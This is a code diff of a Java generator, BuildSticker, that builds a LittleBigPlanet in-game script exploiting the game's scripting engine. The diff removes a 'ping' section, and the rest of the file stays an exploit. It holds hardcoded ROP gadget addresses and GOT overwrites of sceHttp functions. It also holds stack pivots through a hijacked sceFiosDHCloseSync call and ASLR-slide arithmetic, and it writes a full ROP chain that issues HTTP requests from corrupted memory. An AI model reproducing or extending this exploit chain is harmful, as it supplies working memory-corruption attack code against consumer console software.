@@ -139,7 +139,6 @@ public final class BuildSticker {
     static final long G_POP_RDX_RET        = 0x00B5C742L;
     static final long G_POP_RCX_RET        = 0x00D20C2AL;
     static final long G_POP_R8_RET         = 0x0048F073L;
-    static final long G_POP_R9_RET         = 0x00E8B3F1L;  // pop r9 ; ret (estimated)
     static final long G_MOV_PTR_RAX_RET    = 0x0041FC3BL;  // mov [rdi], rax ; ret
     static final long G_MOV_RDI_RAX_REPMOV = 0x00EF76E3L;  // mov rdi, rax ; rep movsd ; ret
     static final long G_RESTORE_RSP        = 0x00A95F0DL;  // lea rsp,[rbp-0x10] ; pop rbx ; pop r14 ; pop rbp ; ret
@@ -150,8 +149,6 @@ public final class BuildSticker {
     static final long PTR_DELETE_CONN     = 0x014CCF60L;   // sceHttpDeleteConnection
     static final long PTR_SET_COOKIES     = 0x014CCE80L;   // sceHttpSetCookieEnabled
     static final long PTR_ADD_HEADER      = 0x014CCF08L;   // sceHttpAddRequestHeader
-    static final long PTR_CREATE_REQUEST  = 0x014CCF58L;   // sceHttpCreateRequest (GOT, estimated)
-    static final long PTR_SEND_REQUEST    = 0x014CCFA0L;   // sceHttpSendRequest (GOT, estimated)
     static final long PTR_FIOS_DH_CLOSE   = 0x014CCD20L;   // sceFiosDHCloseSync
     static final long FN_HTTP_INIT        = 0x00421E80L;   // LBP http template init
 
@@ -161,7 +158,6 @@ public final class BuildSticker {
 
     /** free space inside the .data section (0x01460000 - 0x0181A4B7) */
     static final long SCRATCH_SERVER      = 0x017C9000L;
-    static final long SCRATCH_PING_PATH   = 0x017C9100L;
     static final long SCRATCH_ROP         = 0x017C8000L;
 
     static final int PORT = 443;
@@ -412,76 +408,6 @@ public final class BuildSticker {
             writePtr(PTR_ADD_HEADER, G_XOR_EAX_RET, "sceHttpAddRequestHeader := xor eax,eax ; ret");
         }
 
-/* ---------- E. explicit ping to /lbp/sticker-ping ---------- */
-        // Now that sceHttpCreateConnection is patched to return our connId,
-        // we can use it to create a request and send it to verify the connection works.
-        // This runs immediately when the sticker is pressed, without waiting for
-        // the game to make a natural HTTP request (Community, Messages, Play Now, Publish).
-
-        // Write "/lbp/sticker-ping" string to scratch memory
-        long pingPathAddr = SCRATCH_PING_PATH;
-        String pingPath = "/lbp/sticker-ping";
-        for (int i = 0; i < pingPath.length(); i++) {
-            int r = alloc();
-            emit(lci(r, pingPath.charAt(i)), "LC.i r" + r + ", '" + pingPath.charAt(i) + "'");
-            loadAddr(pingPathAddr + i);
-            emit(addi(rNext - 1, rNext - 1, R_SLIDE), "ADD.i r" + (rNext - 1) + ", r" + (rNext - 1) + ", r" + R_SLIDE + " ; + ASLR slide");
-            emit(setRpMember(rNext - 1, FIELD_REF, r, T_S32),
-                    "SET_RP_MEMBER r" + (rNext - 1) + ".<ping path byte> (s32), r" + r);
-        }
-        int z = alloc();
-        emit(lci(z, 0), "LC.i r" + z + ", 0  ; NUL terminator");
-        loadAddr(pingPathAddr + pingPath.length());
-        emit(addi(rNext - 1, rNext - 1, R_SLIDE), "ADD.i r" + (rNext - 1) + ", r" + (rNext - 1) + ", r" + R_SLIDE + " ; + ASLR slide");
-        emit(setRpMember(rNext - 1, FIELD_REF, z, T_S32),
-                "SET_RP_MEMBER r" + (rNext - 1) + ".<ping path null> (s32), r" + z);
-
-        // Write "GET" string for HTTP method
-        long getStringAddr = SCRATCH_PING_PATH + 0x20;
-        String getStr = "GET";
-        for (int i = 0; i < getStr.length(); i++) {
-            int r = alloc();
-            emit(lci(r, getStr.charAt(i)), "LC.i r" + r + ", '" + getStr.charAt(i) + "'");
-            loadAddr(getStringAddr + i);
-            emit(addi(rNext - 1, rNext - 1, R_SLIDE), "ADD.i r" + (rNext - 1) + ", r" + (rNext - 1) + ", r" + R_SLIDE + " ; + ASLR slide");
-            emit(setRpMember(rNext - 1, FIELD_REF, r, T_S32),
-                    "SET_RP_MEMBER r" + (rNext - 1) + ".<get byte> (s32), r" + r);
-        }
-        int gz = alloc();
-        emit(lci(gz, 0), "LC.i r" + gz + ", 0  ; NUL terminator");
-        loadAddr(getStringAddr + getStr.length());
-        emit(addi(rNext - 1, rNext - 1, R_SLIDE), "ADD.i r" + (rNext - 1) + ", r" + (rNext - 1) + ", r" + R_SLIDE + " ; + ASLR slide");
-        emit(setRpMember(rNext - 1, FIELD_REF, gz, T_S32),
-                "SET_RP_MEMBER r" + (rNext - 1) + ".<get null> (s32), r" + gz);
-
-        // Build ping ROP chain at SCRATCH_ROP + 0x200 (after main chain)
-        long pingRopAddr = SCRATCH_ROP + 0x200;
-        buildPingRop(pingRopAddr, pingPathAddr);
-
-        // Patch ping ROP slots with runtime values
-        // Slot 3 (connId) - read from DATA_CONN_ID
-        int rConnId = alloc();
-        readU32(DATA_CONN_ID, rConnId, "connId = *(0x017C6BC8)");
-        patchPingRopSlot(3, rConnId, "connId");
-
-        // Slot 14 (sceHttpCreateRequest GOT)
-        int rCreateReq = gotPtr(PTR_CREATE_REQUEST);
-        patchPingRopSlot(PING_CREATE_REQ_SLOT, rCreateReq, "sceHttpCreateRequest (GOT)");
-
-        // Slot 24 (sceHttpSendRequest GOT)
-        int rSendReq = gotPtr(PTR_SEND_REQUEST);
-        patchPingRopSlot(PING_SEND_REQ_SLOT, rSendReq, "sceHttpSendRequest (GOT)");
-
-        // Execute ping ROP chain via second stack pivot
-        readPtr(PTR_FIOS_DH_CLOSE, rSaved, "save sceFiosDHCloseSync (for ping)");
-        writePtr(PTR_FIOS_DH_CLOSE, G_PUSH_RSI_JMP_RSI, "sceFiosDHCloseSync := push rsi ; jmp [rsi] (ping)");
-        int rPingChain = alloc();
-        emit(lci(rPingChain, (int) (pingRopAddr + 16)), "LC.i r" + rPingChain + ", 0x" + Integer.toHexString((int) (pingRopAddr + 16)) + "   ; ping chain + 16");
-        emit(arg(0, rPingChain, T_RAW_PTR), "ARG a0, r" + rPingChain + " (rawptr)");
-        emit(call(alloc(), fnRef("System.DirectoryClose", T_VOID), T_VOID),
-                "CALL System.DirectoryClose(ping chain)  ; RSI = ping chain, stack pivots");
-        writeReg(PTR_FIOS_DH_CLOSE, rSaved, "restore sceFiosDHCloseSync");
-
         emit(ret(0, T_VOID), "RETURN");
 
         /* ---------- assemble ---------- */
@@ -634,13 +560,6 @@ public final class BuildSticker {
                 "SET_RP_MEMBER rop[" + index + "] <= " + what + "  [runtime]");
     }
 
-    static void patchPingRopSlot(int index, int src, String what) {
-        if (index < 0) throw new IllegalStateException("bad ping ROP slot for " + what);
-        loadAddr(SCRATCH_ROP + 0x200 + index * 8L);
-        emit(setRpMember(rNext - 1, FIELD_REF, src, T_RAW_PTR),
-                "SET_RP_MEMBER ping_rop[" + index + "] <= " + what + "  [runtime]");
-    }
-
     static void writeString(long addr, String text) {
         for (int i = 0; i < text.length(); i++) {
             int r = alloc();
@@ -791,131 +710,6 @@ public final class BuildSticker {
                 loadAddr(addr + i * 8L + half * 4L);
                 emit(setRpMember(rNext - 1, FIELD_REF, r, T_S32),
                         "SET_RP_MEMBER r" + (rNext - 1) + ".<scratch> (s32), r" + r);
-            }
-        }
-    }
-
-    /* ================================================================== *
-     *  6b. Ping ROP chain
-     * ================================================================== */
-
-    static int PING_CREATE_REQ_SLOT = -1;
-    static int PING_SEND_REQ_SLOT = -1;
-
-    /**
-     * Build a ROP chain to:
-     * 1. Call sceHttpCreateRequest(connId, 0, "GET", pingPath, 0, 0, 0)
-     * 2. Call sceHttpSendRequest(reqId, 0, 0)
-     */
-    static void buildPingRop(long addr, long pingPathAddr) {
-        List<Long> pingRop = new ArrayList<>();
-        List<String> pingRopListing = new ArrayList<>();
-        java.util.BitSet pingRopSlided = new java.util.BitSet();
-
-        // We need to read connId from DATA_CONN_ID at runtime
-        // ROP chain layout:
-        // 0: pop rsp ; ret
-        // 1: -> chain + 16
-        // 2: pop rdi ; ret
-        // 3: RUNTIME  connId (read from DATA_CONN_ID)
-        // 4: pop rsi ; ret
-        // 5: 0 (templateId)
-        // 6: pop rdx ; ret
-        // 7: "GET" string address
-        // 8: pop rcx ; ret
-        // 9: pingPathAddr
-        // 10: pop r8 ; ret
-        // 11: 0
-        // 12: pop r9 ; ret
-        // 13: 0
-        // 14: RUNTIME  sceHttpCreateRequest (GOT)
-        // 15: pop rdi ; ret
-        // 16: reqId storage address
-        // 17: mov [rdi], rax ; ret
-        // 18: pop rdi ; ret
-        // 19: reqId (from storage)
-        // 20: pop rsi ; ret
-        // 21: 0
-        // 22: pop rdx ; ret
-        // 23: 0
-        // 24: RUNTIME  sceHttpSendRequest (GOT)
-        // 25: lea rsp,[rbp-0x10] ; pop rbx ; pop r14 ; pop rbp ; ret
-
-        // We need a "GET" string in memory
-        long getStringAddr = SCRATCH_PING_PATH + 0x20;  // after ping path
-        // Write "GET" there (done in buildScript)
-
-        entry(pingRop, pingRopListing, pingRopSlided, G_POP_RSP_RET, "pop rsp ; ret", true);
-        entry(pingRop, pingRopListing, pingRopSlided, addr + 16, "  -> chain + 16", false);
-
-        entry(pingRop, pingRopListing, pingRopSlided, G_POP_RDI_RET, "pop rdi ; ret", true);
-        entry(pingRop, pingRopListing, pingRopSlided, 0, "  connId                       [RUNTIME]", false);
-
-        entry(pingRop, pingRopListing, pingRopSlided, G_POP_RSI_RET, "pop rsi ; ret", true);
-        entry(pingRop, pingRopListing, pingRopSlided, 0, "  0 (templateId)", false);
-
-        entry(pingRop, pingRopListing, pingRopSlided, G_POP_RDX_RET, "pop rdx ; ret", true);
-        entry(pingRop, pingRopListing, pingRopSlided, getStringAddr, "  \"GET\"", false);
-
-        entry(pingRop, pingRopListing, pingRopSlided, G_POP_RCX_RET, "pop rcx ; ret", true);
-        entry(pingRop, pingRopListing, pingRopSlided, pingPathAddr, "  pingPath", false);
-
-        entry(pingRop, pingRopListing, pingRopSlided, G_POP_R8_RET, "pop r8 ; ret", true);
-        entry(pingRop, pingRopListing, pingRopSlided, 0, "  0", false);
-
-        entry(pingRop, pingRopListing, pingRopSlided, G_POP_R9_RET, "pop r9 ; ret", true);
-        entry(pingRop, pingRopListing, pingRopSlided, 0, "  0", false);
-
-        PING_CREATE_REQ_SLOT = pingRop.size();
-        entry(pingRop, pingRopListing, pingRopSlided, 0, "[GOT] sceHttpCreateRequest *ptr  [RUNTIME]", false);
-
-        entry(pingRop, pingRopListing, pingRopSlided, G_POP_RDI_RET, "pop rdi ; ret", true);
-        entry(pingRop, pingRopListing, pingRopSlided, DATA_CONN_ID + 4, "  reqId storage", false);
-
-        entry(pingRop, pingRopListing, pingRopSlided, G_MOV_PTR_RAX_RET, "mov [rdi], rax ; ret", true);
-
-        // Now call sceHttpSendRequest(reqId, 0, 0)
-        entry(pingRop, pingRopListing, pingRopSlided, G_POP_RDI_RET, "pop rdi ; ret", true);
-        entry(pingRop, pingRopListing, pingRopSlided, DATA_CONN_ID + 4, "  reqId", false);
-
-        entry(pingRop, pingRopListing, pingRopSlided, G_POP_RSI_RET, "pop rsi ; ret", true);
-        entry(pingRop, pingRopListing, pingRopSlided, 0, "  0", false);
-
-        entry(pingRop, pingRopListing, pingRopSlided, G_POP_RDX_RET, "pop rdx ; ret", true);
-        entry(pingRop, pingRopListing, pingRopSlided, 0, "  0", false);
-
-        PING_SEND_REQ_SLOT = pingRop.size();
-        entry(pingRop, pingRopListing, pingRopSlided, 0, "[GOT] sceHttpSendRequest *ptr [RUNTIME]", false);
-
-        entry(pingRop, pingRopListing, pingRopSlided, G_RESTORE_RSP, "lea rsp,[rbp-0x10] ; pop rbx ; pop r14 ; pop rbp ; ret", true);
-
-        // Write the ping ROP chain to memory
-        writePingRop(addr, pingRop, pingRopSlided);
-
-        // Store the ping ROP listings for output
-        for (String s : pingRopListing) System.out.println("  " + s);
-    }
-
-    static void entry(List<Long> rop, List<String> listing, java.util.BitSet slided, long v, String text, boolean slid) {
-        if (slid) slided.set(rop.size());
-        rop.add(v);
-        listing.add(String.format("%016X  %s%s", v, text, slid ? "   [+slide]" : ""));
-    }
-
-    static void writePingRop(long addr, List<Long> rop, java.util.BitSet slided) {
-        for (int i = 0; i < rop.size(); i++) {
-            long v = rop.get(i);
-            boolean slid = slided.get(i);
-            for (int half = 0; half < 2; half++) {
-                int dword = (int) (v >>> (32 * half));
-                int r = alloc();
-                emit(lci(r, dword), "LC.i r" + r + ", 0x" + Integer.toHexString(dword) + "  ; ping rop[" + i + "]." + half);
-                if (slid && half == 0) {
-                    emit(addi(r, r, R_SLIDE), "ADD.i r" + r + ", r" + r + ", r" + R_SLIDE + "  ; + ASLR slide (ping rop[" + i + "])");
-                }
-                loadAddr(addr + i * 8L + half * 4L);
-                emit(setRpMember(rNext - 1, FIELD_REF, r, T_S32),
-                        "SET_RP_MEMBER r" + (rNext - 1) + ".<ping scratch> (s32), r" + r);
             }
         }
     }
